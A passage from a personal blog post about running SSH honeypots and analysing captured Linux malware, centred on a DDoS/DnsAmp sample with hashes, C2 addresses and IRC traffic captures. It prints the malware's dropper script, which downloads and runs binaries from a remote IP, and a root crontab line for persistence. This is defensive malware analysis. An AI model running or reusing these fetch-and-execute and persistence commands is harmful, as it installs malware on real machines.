<p>So we can see several things going on: dropped files, additional payload downloads, tries to persist itself in as many places as possible, masks its presence with different process names. These two pieces of malware were the first ones I&rsquo;ve analyzed (ever) so I don&rsquo;t have much indepth analysis other than what I was able to gather from network traffic and observations through docker. For a more detailed write up <a href="https://securelist.com/analysis/publications/64361/versatile-ddos-trojan-for-linux/">Kaspersky has a great writeup, including reversed source code</a>.</p>

<p><a name="ddos-flood"></a></p>

<h2 id="ddos-flood-dnsamp">DDOS.Flood / DnsAmp</h2>

<p><strong>Common name:</strong> DDOS.Flood / DnsAmp<br>
<strong>sha256:</strong> d9d58fb1f562e7c22bb67edf9dc651fa8bc823ff3e8aecc04131c34b5bc8cf03<br>
<strong>md5:</strong> b589c8a722b5c35d4bd95487b47f8b8b</p>

<p>Initial look:</p>

<ul>
<li>Initial payload is a shell script</li>
<li>Another DDOS type malware</li>
<li>Drops several binaries that cover as many architectures as possible (ARM/MIPS/etc)</li>
<li>Masks itself as system interrupt process (irq)</li>
<li>Uses IRC + HTTP for communication</li>
<li>Connects to 2 IPs:

<ul>
<li><strong>52.8.123.250:80</strong></li>
<li>Running on AWS, most likely compromised.</li>
<li><strong>49.231.211.193:8080</strong></li>
<li>Running somewhere in Australia.</li>
</ul></li>
<li>Initial payload is a bash script</li>
</ul>

<h4 id="dropped-files-1">Dropped Files</h4>

<p><em>Initial Payload</em></p>

<pre><code class="language-bash">#!/bin/bash
wget -c http://52.8.123.250/x/tty0 -P /var/run &amp;&amp; chmod +x /var/run/tty0 &amp;&amp; /var/run/tty0 &amp;
wget -c http://52.8.123.250/x/tty1 -P /var/run &amp;&amp; chmod +x /var/run/tty1 &amp;&amp; /var/run/tty1 &amp;
wget -c http://52.8.123.250/x/tty2 -P /var/run &amp;&amp; chmod +x /var/run/tty2 &amp;&amp; /var/run/tty2 &amp;
wget -c http://52.8.123.250/x/tty3 -P /var/run &amp;&amp; chmod +x /var/run/tty3 &amp;&amp; /var/run/tty3 &amp;
wget -c http://52.8.123.250/x/tty4 -P /var/run &amp;&amp; chmod +x /var/run/tty4 &amp;&amp; /var/run/tty4 &amp;
wget -c http://52.8.123.250/x/tty5 -P /var/run &amp;&amp; chmod +x /var/run/tty5 &amp;&amp; /var/run/tty5 &amp;
wget -c http://52.8.123.250/x/pty &amp;&amp; chmod +x pty &amp;&amp; ./pty &amp;
wget -c http://52.8.123.250/x/pty -P /var/run &amp;&amp; chmod +x /var/run/pty &amp;&amp; /var/run/pty &amp;
rm -rf /var/run/1sh
</code></pre>

<p><em>/var/spool/cron/crontabs/root</em></p>

<pre><code># DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/var/run/.x001804289383 installed on Tue May 17 21:20:29 2016)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
* * * * * /run/pty &gt; /dev/null 2&gt;&amp;1 &amp;
</code></pre>

<h4 id="network-traffic-1">Network Traffic</h4>

<p><em>Port 8080</em></p>

<pre><code>Frame 4660: 556 bytes on wire (4448 bits), 556 bytes captured (4448 bits)
Ethernet II, Src: RealtekU_12:35:02 (52:54:00:12:35:02), Dst: CadmusCo_26:3d:b9 (08:00:27:26:3d:b9)
Internet Protocol Version 4, Src: 211.103.199.98, Dst: 10.0.2.15
Transmission Control Protocol, Src Port: 8080 (8080), Dst Port: 46783 (46783), Seq: 17, Ack: 85, Len: 502
Hypertext Transfer Protocol
    :IRC!IRC@izu.ko PRIVMSG x86|x|0|344265|a31f446d :\001VERSION\001\r\n
    :izu.ko 001 x86|x|0|344265|a31f446d :\n
    :izu.ko 002 x86|x|0|344265|a31f446d :\n
    :izu.ko 003 x86|x|0|344265|a31f446d :\n
    :izu.ko 004 x86|x|0|344265|a31f446d :\n
    :izu.ko 005 x86|x|0|344265|a31f446d :\n
    :izu.ko 005 x86|x|0|344265|a31f446d :\n
    :izu.ko 005 x86|x|0|344265|a31f446d :\n
    :izu.ko 375 x86|x|0|344265|a31f446d :\n
    :izu.ko 372 x86|x|0|344265|a31f446d :- 27/10/2014 11:36\r\n
    :izu.ko 372 x86|x|0|344265|a31f446d :- !!\r\n
    :izu.ko 376 x86|x|0|344265|a31f446d :\n

Frame 4665: 257 bytes on wire (2056 bits), 257 bytes captured (2056 bits)
Ethernet II, Src: RealtekU_12:35:02 (52:54:00:12:35:02), Dst: CadmusCo_26:3d:b9 (08:00:27:26:3d:b9)
Internet Protocol Version 4, Src: 211.103.199.98, Dst: 10.0.2.15
Transmission Control Protocol, Src Port: 8080 (8080), Dst Port: 46783 (46783), Seq: 519, Ack: 393, Len: 203
Hypertext Transfer Protocol
    :x86|x|0|344265|a31f446d!x00@96.228.244.140 JOIN :#x86\r\n
    :izu.ko 332 x86|x|0|344265|a31f446d #x86 :https://www.youtube.com/watch?v=dDp3lfE_In8\r\n
    :izu.ko 333 x86|x|0|344265|a31f446d #x86 Jorgee 1463456542\r\n

</code></pre>

<h4 id="overview-1">Overview</h4>

<p>I can see several things happening here, the most interesting I think is the multiple architecture support - perhaps trying to compromise routers and other smaller IoT devices that are running ARM or other mobile processors. It tries to mask itself as a pty process and then installs itself in crontab. Finally it does some communication over IRC in plain text. Based on the limited network communication I saw, I&rsquo;m guessing this might belong to a Spanish hacker group (from the youtube link) - or it might just be a coincidence of what I saw while executing the malware.</p>

<h2 id="building-the-honeypot-network">Building the Honeypot Network</h2>

<p>Finding cheap hosts is important, we don&rsquo;t care about a lot of the niceties we&rsquo;d normally want in a VPS provider or cloud provider (like DO or AWS) - what we want is a cheap isolated environment to run our honeypots in (either cheaper kvm/xen, or even cheaper openvz). To that end, serverbear.com is great for simple price comparison shopping.</p>

<p>I currently am still trying to find the best locations and providers to use but have a mix of OpenVZ and KVM instances running. The main OS is Ubuntu, however any flavor of linux will do since the go binary will be compatible on any of them.</p>

<p>And finally, in order to get the best representation of activity, it&rsquo;s best to spread the servers out globally so you can get a wide geographic coverage (Europe, America, Asia, etc).</p>

<h2 id="future-plans">Future plans</h2>

<ul>
<li>Payload downloading

<ul>
<li>Download the payloads as they get &lsquo;executed&rsquo; on the honeypot</li>
</ul></li>
<li>Automate analysis

<ul>
<li>Automate using docker and other tools to produce reliable analysis output</li>
</ul></li>
<li>More honeypots

<ul>
<li>Right now I&rsquo;m only running 6 - each is about $2-5/month</li>
</ul></li>
<li>Automate WHOIS lookups

<ul>
<li>Automate abuse complaint sends and track which providers are actually monitoring and care about what their networ is used for</li>
</ul></li>
<li>More services

<ul>
<li>Expand honeypot protocols to FTP, HTTP Proxies (Polipo, Squid, etc), etc</li>
</ul></li>
</ul>
 </div>
      <footer class="post-footer">

  <div class="post-footer-data">
    
<div class="tags">
    
</div>

  </div>

</footer>


  
<div id="disqus_thread"></div>
<script type="text/javascript">

(function() {
    
    
    if (window.location.hostname == "localhost")
        return;

    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    var disqus_shortname = 'bluescripts';
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>
  Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
</noscript>
<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>




    </article>
  </div>
  <div class="sidebar">
  <section>
    <h1>Projects & Software</h1>
    <ul>
      <li><a href="https://github.com/joshrendek/docker-conductor">Docker Conductor</a> is a docker orchestration tool.</li>
      <li><a href="http://sshpot.com/">sshpot.com</a> is a SSH honeypot service written in Go (both web service and client are open source).</li>
      <li><a href="http://ifcfg.net/">ifcfg.net</a> is a simple 'what is my IP' service with a few extra RESTful endpoints.</li>

      <li><a href="/projects/">View More</a>

      <li><a href="https://github.com/joshrendek?tab=repositories"><img src="/images/github.png" style='border: none;'> More on GitHub</a></li>
      <li><a href="https://rubygems.org/profiles/joshrendek">Gems @ RubyGems</a></li>
    </ul>
  </section>

  <section>
    <h1>Other Blogs</h1>
    <ul>
      <li><a href="http://tendermeatlove.com">Tender Meat Love</a> is my blog about cooking.</li>
      <li><a href="http://hydronerd.com">Hydro Nerd</a> is my blog about hydroponics and gardening.</li>
    </ul>
  </section>

  <section>
    <h1>Recent Posts</h1>
    <ul>
      
      <li><a href="https://joshrendek.com/2016/06/building-honeypots-and-analyzing-linux-malware/">Building honeypots and analyzing linux malware</a></li>
      
      <li><a href="https://joshrendek.com/2015/11/understanding-elasticsearch-performance/">Understanding ElasticSearch Performance</a></li>
      
      <li><a href="https://joshrendek.com/2015/11/building-a-distributed-waitgroup-with-go-and-redis/">Building a distributed WaitGroup with Go and Redis</a></li>
      
      <li><a href="https://joshrendek.com/2015/11/docker-and-ping-sendmsg-operation-not-permitted/">Docker and ping: sendmsg: Operation not permitted</a></li>
      
      <li><a href="https://joshrendek.com/2015/10/influx-alert/">Influx Alert</a></li>
      
    </ul>
  </section>

</div>

</main>
  <footer>

  <div class="social-links-footer">

  

  

  

  

  

  <div class="social-link">
  <a href="https://joshrendek.com/index.xml" target="_blank">RSS</a>
  </div>

</div>


  <div class="copyright"> © Copyright 2008-2017 Josh Rendek </div>

  </footer>

</body>
</html>

